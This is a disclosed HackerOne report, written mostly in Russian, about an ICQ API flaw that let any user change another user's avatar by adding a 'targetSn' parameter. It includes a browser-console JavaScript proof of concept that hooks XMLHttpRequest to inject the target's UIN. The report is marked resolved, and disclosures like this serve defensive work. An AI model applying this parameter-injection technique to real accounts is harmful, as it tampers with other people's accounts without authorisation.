---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '786745'
original_report_id: '786745'
title: '[API] ICQ user''s avatar can be manipulated remotely'
weakness: Improper Input Validation
team_handle: mailru
created_at: '2020-01-31T08:36:43.169Z'
disclosed_at: '2020-02-14T19:21:04.687Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 70
asset_identifier: ICQ
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- improper-input-validation
---

# [API] ICQ user's avatar can be manipulated remotely

## Metadata

- HackerOne Report ID: 786745
- Weakness: Improper Input Validation
- Program: mailru
- Disclosed At: 2020-02-14T19:21:04.687Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Description:
При обращении к API методу установки аватара пользователя (https://ub.icq.net/files/api/v1.1/avatar/set)
Можно передать дополнительный GET параметр: targetSn - с установленным UIN'ом любого пользователя
Тем самым можем изменить аватарку у любого пользователя

## Steps To Reproduce:
  1. Открыть Web версию ICQ
  1. Вставляем в консоль браузера следующий код (Указав вместо ___UIN___ атакуемый аккаунт):
```
const XHR_OPEN = XMLHttpRequest.prototype.open;

XMLHttpRequest.prototype.open = function (...args) {
  let url = new URL(args[1])
  if (url.pathname === '/files/api/v1.1/avatar/set') {
    url.searchParams.set('targetSn', '___UIN___')
    args[1] = url.toString()
    console.log(args[1])
  }
  return XHR_OPEN.apply(this, args);
}
```
  1. Заменить аватар пользователя

## Скринкаст:
█████████

## Impact

Частичный доступ к управлению чужими аккаунтами (возможно уязвимость применима и к другим методам API).

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
